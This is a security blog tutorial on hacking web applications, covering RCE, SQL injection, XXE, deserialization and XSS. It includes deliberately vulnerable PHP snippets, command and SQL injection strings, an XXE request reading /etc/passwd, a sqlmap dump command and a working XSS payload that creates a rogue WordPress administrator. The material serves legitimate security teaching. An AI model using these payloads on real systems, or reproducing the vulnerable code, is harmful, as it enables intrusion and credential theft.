---
source: detectify
source_url: https://labs.detectify.com/how-to/hack-web-applications/
title: "How To Hack Web Applications in 2022: Part 1 - Labs Detectify"
author: "Detectify"
published: 2022-05-16T13:13:18+00:00
description: "A step-by-step guide on how to hack a web application from an ethical hacker so your security team can better learn what threats to consider."
---

[Home](https://labs.detectify.com/)/ [How to](https://labs.detectify.com/category/how-to/)/ [How To Hack Web Applications in 2022: Part 1](https://labs.detectify.com/how-to/hack-web-applications/)

[How to](https://labs.detectify.com/category/how-to/ "How to")

# How To Hack Web Applications in 2022: Part 1

![](https://labs.detectify.com/_next/image/?url=https%3A%2F%2Flabsadmin.detectify.com%2Fapp%2Fuploads%2F2021%2F08%2Fhakluke.jpg&w=128&q=75)

**Hakluke** May 16, 2022

[hakluke](https://labs.detectify.com/tag/hakluke/ "hakluke")

[Twitter](https://twitter.com/intent/tweet?url=https://labs.detectify.com/how-to/hack-web-applications/ "Share on Twitter") [LinkedIn](https://www.linkedin.com/sharing/share-offsite/?url=https://labs.detectify.com/how-to/hack-web-applications/ "Share on LinkedIn")

![How To Hack Web Applications in 2022: Part 1](https://labs.detectify.com/_next/image/?url=https%3A%2F%2Flabsadmin.detectify.com%2Fapp%2Fuploads%2F2022%2F08%2Fhow-to-hack-web-apps.png&w=3840&q=75)

**TL/DR: Web applications can be exploited to gain unauthorized access to sensitive data and web servers. Threats include SQL Injection, Code Injection, XSS, Defacement, and Cookie poisoning. Hacker Luke ‘ _[Hakluke’](https://www.twitter.com/hakluke)_ Stephens details the steps to hack a web application, so security teams can hack and know what threats to consider.**

You can think of this as a sequel to [How to Hack APIs in 2021](https://labs.detectify.com/2021/08/10/how-to-hack-apis-in-2021/). That blog post was such a success that it won the Tour de France and multiple Golden Globe awards. Some even reported that reading the blog post cured their COVID, but our legal department advised us against making these claims.  You will notice that there is some overlap between the “How to Hack APIs” post and this post, simply because APIs are basically web applications without a frontend. We have had to split this blog post up into multiple sections because otherwise, we risk exploding the internet.

Without further ado; let us learneth how to hacketh webeth applicationeths.

## **Types of Web Applications**

Before we start with the actual hacking stuff, it’s important to distinguish between two different common architectures of web applications.

## **Single Page Applications (SPAs)**

Web applications have changed a bit in the last decade or two. Many modern web applications today are Single Page Applications (SPAs). Single page applications look like this. All dynamic data on the page is dynamically gathered and loaded by client-side JavaScript.

![](https://labsadmin.detectify.com/app/uploads/2022/05/image2.png)

## **Traditional Web Applications**

More traditional web applications typically look like this: entire pages are refreshed every time data needs to be updated. The full responses are typically prepared server-side and sent to the browser in one big lump:

![](https://labsadmin.detectify.com/app/uploads/2022/05/image21.png)

While these two types of applications operate differently, the process of attacking them is quite similar. Both design patterns may be vulnerable to the same _types_ of vulnerabilities, although there can be some differences in the way that those attacks might be executed. More on that later.

## **Setting Up For Testing Web Applications**

You might want to read this section if you’re starting from zero. Otherwise, feel free to skip ahead or don’t. Do what you want; I’m not your dad. Unless you actually are one of my kids reading this in years to come. In which case web applications probably don’t even exist anymore. By now, we’re probably NFT bobbleheads floating around in Zuckerberg’s metaverse. Focus Luke, focus.

You’re going to need:

- A web browser
- An interception proxy (we’ll using Burp Suite for this example)

These days, Burp Suite comes with Chromium built-in, so you don’t even need to configure a web browser – you’ll see what I mean very soon.

We want our setup to look like this. The intercept proxy will _intercept_ the HTTP requests going to and from the web server from our web browser, allowing us to view, capture and edit them on the fly.

![](https://labsadmin.detectify.com/app/uploads/2022/05/image5-1.png)

This allows us to have complete control over the data that is sent to and from our web browser, far beyond the control that the web application allows us by itself.

## **Setting up Burp Suite**

For the purposes of this article, we’ll use Burp Suite Community Edition as our intercept proxy. It’s totally free, and you can download it from [here](https://portswigger.net/burp/releases/professional-community-2022-1-1?requestededition=community). The “Community Edition” is just a less featureful version of Burp Suite Professional, which costs $399 per user per year.

When you open Burp up for the first time, you’ll be presented with a screen like this:

![](https://labsadmin.detectify.com/app/uploads/2022/05/image23.png)

If you’re using the Free version, you can’t save projects to disk, so just smash that “Next” button. Next, you will be presented with this screen.

![](https://labsadmin.detectify.com/app/uploads/2022/05/image15.png)

There are a few options here for loading a Burp configuration file. Configuration files allow you to set up Burp Suite with your preferred options and load them at startup. For now, though, just choose “Use Burp defaults” and click “Start Burp.”

Finally, Burp will open. Initially, it will open to the “Learn” tab, which has links to a few great resources for learning how to use the various features of the tool.

![](https://labsadmin.detectify.com/app/uploads/2022/05/image8-1.png)

Let’s click the “Proxy” tab, which will take you to the following screen:

![](https://labsadmin.detectify.com/app/uploads/2022/05/image7.png)

Click “Open browser.” This will open a Chromium browser that is already set up to proxy all traffic through Burp Suite. In that browser, navigate to [https://detectify.com](https://detectify.com/). Switch to the “Target” tab

![](https://labsadmin.detectify.com/app/uploads/2022/05/image6.png)

This tab allows you to view every request and response that entered/exited the browser. On the left hand side, you can see that the requests/responses are organized into a tree view.

Burp Suite has a lot of different features and a bit of a learning curve. I’d like this blog post to be more about hacking web applications in general, instead of just learning to use Burp Suite. If you need more of a primer on Burp Suite, I’d recommend going through the “ [Getting Started](https://portswigger.net/burp/documentation/desktop/getting-started)” section of the official documentation.

## **OWASP Top 10**

The [OWASP Top 10](https://owasp.org/www-project-top-ten/) is a document that outlines 10 different vulnerability types typically considered the most critical security risks to web applications. The list is revised every 4 years or so, and the most recent one was released in 2021. It looks like this:

01. Broken Access Control
02. Cryptographic Failures
03. Injection
04. Insecure Design
05. Security Misconfiguration
06. Vulnerable and Outdated Components
07. Identification and Authentication Failures
08. Software and Data Integrity Failures
09. Security Logging and Monitoring Failures
10. Server-Side Request Forgery

It’s worth noting that there has been [some criticism](https://danielmiessler.com/blog/thoughts-on-the-owasp-top-10-2021/) of this list, mostly around the fact that it doesn’t have a clear identity. To quote Daniel Miessler directly:

_“Is it a list of vulnerabilities? Is it a list of vulnerability categories? Is this for developers? Is this for security companies? Is this for security tool output labeling? Is it a tool for helping security metrics functions within companies?”_

This is a fair criticism as some of the items on the list are too vague. Technically every vulnerability could fall under “Insecure Design”, no? Regardless, it’s good to know that the OWASP top 10 exists, because it is truly an industry standard, and you will hear about it a lot.

## **Types of Web Application Vulnerabilities**

This is not meant to be an exhaustive list (if it was, it could fill several books), but I’m going to cover a bunch of common types of web application vulnerabilities along with some tips on finding them.

## **Remote Command/Code Execution (RCE)**

Remote code/command execution are two vulnerability classes that have a similar impact. Remote _code_ execution refers to a situation where an attacker is able to execute _code_ on the server – usually, the same server-side language that the application is using (e.g., PHP, Python, JavaScript). Remote _command_ execution occurs when an operating system command can be injected into the web application and is executed on the server. It’s good to note that remote _code_ execution will typically result in the ability to execute commands anyway. For this reason, it is common for people just to use the term “Remote Code Execution” to cover both scenarios, but it’s useful to know the difference.

RCE is typically considered to be a vulnerability of critical severity because it allows the attacker a _lot_ of privileges, well beyond what any normal web application user should have. If an attacker can run code/commands on a system, then they can typically access all data on that system, perform arbitrary tasks, take full control of the web application running on that server, and pivot to access data from adjoining database servers, etc.

### **Finding Remote Code/Command Execution Vulnerabilities**

The method for finding these vulnerabilities varies a lot depending on the functionality of the application. It is worth checking for these types of vulnerabilities anywhere that you suspect user input may become part of a command or code snippet.

A common example of remote _command_ execution is an application that is designed to ping a user-defined IP address and return the results to you. Let’s take a look at how that might look in PHP:

```
<?php

$ip = $_GET['ip'];

echo shell_exec("ping -c 1 " . $ip);

?>
```

As you can see, the $ip variable stems from user input; in this case, the GET parameter called ip. The value of this parameter is then appended to the ping command. Used innocently, the output will look something like this:

![](https://labsadmin.detectify.com/app/uploads/2022/05/image11.png)

Here’s the catch – it’s trivial for an attacker to add more commands to the end of the IP address by injecting something like 127.0.0.1; whoami.

Here’s what that looks like:

![](https://labsadmin.detectify.com/app/uploads/2022/05/image3.png)

Note that after the ping output, we can see the output of the whoami command. In this case, the web server using is running as the highly privileged “root” user. Oops.

From here, it is easy to imagine how an attacker might gain additional access by pivoting to other hosts or cause additional damage by – I don’t know – maybe, removing every file on the system?

Below you can see an example of remote code execution. In this example, the developer intended to create an application where a user could pass a math problem via a GET parameter, and the server would respond with the answer

```
<?php

$calculate = $_GET['calculate'];

eval('echo '.$calculate.';');

?>
```

Let’s try it out with a simple 1+1.

![](https://labsadmin.detectify.com/app/uploads/2022/05/image1.png)

It responds with 2. While this may sound like a developer win, it is in fact, an epic lose . Any value that is passed to the calculated parameter will be executed as PHP code, whether it is a math problem or not. For example, if we pass shell\_exec(‘whoami’), that PHP code will execute, and we can see the result in the HTTP response:

![](https://labsadmin.detectify.com/app/uploads/2022/05/image4-1.png)

Root access, _noice_ .

The examples above are obvious and contrived, but it’s not hard to imagine how similar code might make its way into a complex production environment.

## **SQL Injection (SQLi)**

Much like RCE, SQL injection is an injection vulnerability. This time, instead of injecting server-side code or shell commands, we are injecting SQL statements into part of an SQL query. As an example, let’s set up another basic PHP application that uses SQLite3 to store a database of users.

Here’s what the users table looks like. It has three columns, the first is a unique numeric ID, the second is the user’s name, and the third is the user’s password in plain text .

![](https://labsadmin.detectify.com/app/uploads/2022/05/image17.png)

The developer wanted to introduce a friendly, personalized greeting to the user when they logged in, so they implemented the following code:

```
<?php

$db = new SQLite3('test.db');

$result = $db->query("SELECT name FROM users WHERE id = " . $_GET['userid']);

while ($row = $result->fetchArray()) {

    echo "Hello, " . $row['name'] . "!n";

}

?>
```

The idea is simple, the user sends the application their ID. Based on that ID, the server looks up the user’s name and prints “Hello, $name!”. Let’s try it out.

![](https://labsadmin.detectify.com/app/uploads/2022/05/image16.png)

The problem is, that we can append any SQL that we want, and it will become part of the SQL query. For example, if we wanted to see the names of all users, we could inject 1 OR 1=1. This would mean that the full query becomes:

SELECT name FROM users WHERE id = 1 OR 1=1;

As you may know, 1 always equals 1, so we end up printing out all of the names in the database:

![](https://labsadmin.detectify.com/app/uploads/2022/05/image22.png)

To make matters worse, we could also use a UNION statement to print out the passwords of each user. The injection could look something like this: 1 UNION SELECT password FROM users. The full query then becomes:

```
SELECT name FROM users WHERE id = 1 UNION SELECT password FROM users;
```

Here you can see it in action:

![](https://labsadmin.detectify.com/app/uploads/2022/05/image12.png)

### **SQLMap**

I couldn’t write about SQL injection without including a section for [SQLMap](https://github.com/sqlmapproject/sqlmap). SQLMap is a tool that attempts to automatically detect SQL injections, figure out the most efficient way to exploit them, and then exfiltrate data.

I could exploit this SQL injection in an automated fashion by running the following command:

```
python3 ~/tools/sqlmap-dev/sqlmap.py -u "http://localhost:1234/sqli.php?userid=1" --dbms=sqlite -T users --dump
```

SQLMap does some automated testing:

![](https://labsadmin.detectify.com/app/uploads/2022/05/image14.png)

Then it finds that the userid parameter is vulnerable, and detects a method for exploiting it:

![](https://labsadmin.detectify.com/app/uploads/2022/05/image13.png)

Then it exfiltrates all of the data from the users table, prints it in a pretty ASCII table, and exports it to a CSV file for perusing at a later date. How convenient.

![](https://labsadmin.detectify.com/app/uploads/2022/05/image18.png)

## **XML External Entity Injection (XXE)**

XXE stands for [XML External Entity](https://blog.detectify.com/2018/04/17/owasp-top-10-xxe/). This injection vulnerability can be tested anywhere a web application is used to process XML data. SOAP APIs could also be vulnerable to XXE injection because they are based in XML. Other examples include RSS feed readers, Office Open XML parsers (including Microsoft Office documents), and almost anywhere that XML originating from user input is parsed by a server.

An endpoint that uses XML might look something like this:

```
POST /soap/v2/user HTTP/1.1

Host: example.com

Content-Type: text/xml

 <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE dtd[<!ENTITY username SYSTEM "https://example.com/?username">]>

<SOAP-ENV:Envelope>

<SOAP-ENV:Body>

<getUser>

<id>&username;</id>

</getUser>

</SOAP-ENV:Body>

</SOAP-ENV:Envelope>
```

An XML document uses entities to represent a single object of data and an XML document type definition (DTD) is used to define the entities to be used, structure of the document, etc.

XXE injection is when an attacker injects custom external entities outside of the specified DTD. Once these external entities are parsed by the API, it can allow an attacker to access the application’s internal files, escalate to SSRF, leak sensitive data to an attacker-controlled domain or DOS the server.

This is an example of a request where an attacker has injected an external custom entity called XXE and the purpose of this entity is to retrieve an internal file:

```
POST /soap/v2/user HTTP/1.1

Host: example.com

Content-Type: text/xml

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>

<SOAP-ENV:Envelope>

<SOAP-ENV:Body>

<getUser>

<id>&xxe;</id>

</getUser>

</SOAP-ENV:Body>

</SOAP-ENV:Envelope>
```

If the API allows the usage of a standard XML parser to process the data, then this injected external entity will be processed by the application and will return the content of /etc/passwd to the attacker.

## **Insecure Deserialization**

Before we talk about _De_ serialization, let’s first talk about Serialization. Serialization provides a mechanism for a programmatic object to be represented as a sequence of bytes that includes information about the object’s type, the types of data stored in the object, and the data itself.

In short, serialization makes it possible to store a programmatic object as a string; this means that an object can be serialized on one system and then deserialized on a totally different system. It is also often used to store objects in a database to be used later.

Security concerns arise when a web application takes a serialized object from a user and then deserializes it on the web server. That’s when we call it “insecure deserialization.”

### **Tampering With Object Values**

There are a couple of different ways that you may exploit insecure deserialization vulnerabilities. One of them is simply to tamper with the values of the object. If a developer is allowing a user to provide a serialized object, then there is a good chance that they never expected this object to be tampered with. One example might be a Cookie being a serialized object, where you can flip your own user’s isAdmin flag to be True inside the object, allowing you to access administrative functionality in the application.

### **Unserialize() to RCE**

The other method of exploiting insecure deserialization vulnerabilities is perhaps more sinister. If the application does not restrict the type of classes that are allowed to be deserialized, an attacker may be able to deserialize an arbitrary object of an arbitrary class. This will often lead to remote code execution, because an attacker is able to generate payloads by exploiting gadget chains. This process is difficult and time-consuming to do manually but can be automated by using a tool such as [ysoserial](https://github.com/frohoff/ysoserial).

## **Cross-Site Scripting (XSS)**

Despite the fact that XSS has been around for decades, it is still one of the most prevalent vulnerability classes in the wild. In essence, XSS occurs when an attacker is able to inject arbitrary JavaScript into the context of a user’s browser inside the application that you wish to exploit.

XSS is also an injection vulnerability, but unlike RCE and SQLi, XSS is injected on the client-side (i.e. in the victim’s browser) rather than server-side (on the web server). For this reason, XSS is generally considered to be less severe than RCE and SQLi. There are circumstances in which XSS can be very troublesome though.

First off, let’s demonstrate some vulnerable code:

```
<?php

$name = $_GET['name'];

echo "Hello, " . $name . "!n"

?>
```

In this instance, the $name parameter value is gathered from a GET parameter, and then printed directly to the browser.

We can test this out with curl, as below:

![](https://labsadmin.detectify.com/app/uploads/2022/05/image9-1.png)

Or if we try it in a normal web browser:

![](https://labsadmin.detectify.com/app/uploads/2022/05/image10.png)

It looks pretty harmless, but this becomes a security issue because the text is printed directly to the browser without any encoding. This allows us to inject arbitrary HTML – for example, we might add header tags:

![](https://labsadmin.detectify.com/app/uploads/2022/05/image20.png)

Or, much worse, arbitrary JavaScript:

![](https://labsadmin.detectify.com/app/uploads/2022/05/image19.png)

### **Stealing Cookies**

In such a simple application, this does not carry many risks, but in an application where sensitive actions can be performed, the risk can be much higher. The most typical example of XSS exploitation is stealing session tokens from cookies.

If you’re unfamiliar with what cookies actually are, they are strings of text that are stored in your browser at the request of the server. Once the cookies have been set, your browser will automatically send them to the web server on every request. HTTP is stateless, so cookies are an application’s way of adding state to HTTP transactions. In simpler terms, cookies are often used to identify _who you are_. Your browser should be the only browser to know your session tokens. Whenever your browser sends a request to the server, the server can identify you by checking your session token stored as a cookie.

Here’s the kicker: many cookies can be accessed through JavaScript. This means that if you are able to inject JavaScript into a victim’s browser, you may also be able to steal their cookies, which means you may be able to steal their session tokens, which means you may be able to hijack their session!

This type of exploitation has been partly mitigated since modern browsers have implemented the HttpOnly flag on cookies. If the HttpOnly flag is set to True, then that cookie can not be accessed through JavaScript. Like most optional security measures – many applications still do not implement this, meaning that cookie theft may still be possible.

If cookie theft isn’t possible, there are still other ways to exploit XSS vulnerabilities.

### **Building Custom XSS Payloads**

One such way is to build custom XSS payloads. Keep in mind that JavaScript has full control over the DOM. This means that you can perform (almost) any action that the victim could perform in the browser manually using JavaScript. If you find an XSS vulnerability on a website, you can perform these actions as the victim user by injecting targeted JavaScript payloads.

As an example, if an administrator on a WordPress site executes the following JavaScript payload, it would create a new administrative user on that WordPress instance that the hacker could then use to log in. This example is taken from [one of my previous](https://hakluke.medium.com/upgrade-xss-from-medium-to-critical-cb96597b6cc4) blogs about XSS, which also contains a bunch of other examples.

```
/*

Target: WordPress - tested on 5.1.1 but probably works on other versions

Action: Create a new administrative user with username "hacker", email "hacker@example.com" and password "AttackerP455"

Context: Must be executed in the context of an administrator user

*/

var wp_root = "" // don't add a trailing slash

var req = new XMLHttpRequest();

var url = wp_root + "/wp-admin/user-new.php";

var regex = /ser" value="([^"]*?)"/g;

req.open("GET", url, false);

req.send();

var nonce = regex.exec(req.responseText);

var nonce = nonce[1];

var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=hacker&email=hacker@example.com&pass1=AttackerP455&pass2=AttackerP455&role=administrator";

req.open("POST", url, true);

req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

req.send(params);
```

Once the user is created, the hacker could log in as an Administrator and gain RCE on the server by uploading a malicious plugin or editing the theme’s PHP files. Scary stuff!

## **What’s Next?**

This is only the tip of the iceberg! Part 2 of this blog is coming soon. We’ll cover more vulnerability types, including:

- Server-Side Request Forgery (SSRF)
- Business logic bugs
- Insecure Direct Object References (IDORs)
- Various authentication issues
- Cross-Site Request Forgery (CSRF)
- Directory Traversal
- File Inclusion (LFI/RFI)
- Cache Poisoning
- Much more!

To be in the know when the next part drops, follow us on [Twitter](https://twitter.com/detectify).

_[Detectify Crowdsource](https://detectify.com/crowdsource/ethical-hacking-with-crowdsource) is not your average bug bounty platform. It’s an invite-only community of the best ethical hackers who are passionate about securing modern technologies and end users. Apply to join now._

[Twitter](https://twitter.com/intent/tweet?url=https://labs.detectify.com/how-to/hack-web-applications/ "Share on Twitter") [LinkedIn](https://www.linkedin.com/sharing/share-offsite/?url=https://labs.detectify.com/how-to/hack-web-applications/ "Share on LinkedIn")

![](https://labs.detectify.com/_next/image/?url=https%3A%2F%2Flabsadmin.detectify.com%2Fapp%2Fuploads%2F2021%2F08%2Fhakluke.jpg&w=128&q=75)

**Hakluke**

Owner, Haksec

## Check out more content

External Attack Surface Management (EASM) is the continuous discovery, analysis, and monitoring of an organization’s public facing assets. A substantial part of EASM is the …

January 13, 2023

TL/DR: Web applications have both authentication and authorization as key concepts and if bypassed by an attacker, it can compromise sensitive data. With threats such …

August 05, 2022

TL/DR: It’s becoming increasingly easy to compromise sensitive information for attackers to take advantage of. In this post, Detectify security researcher Alfred Berg wrote about …

June 16, 2022

If you don’t know about HTTP/2 request smuggling then what are you hacking? Alfred Berg, Security Researcher at Detectify, shows you how to set up …

August 26, 2021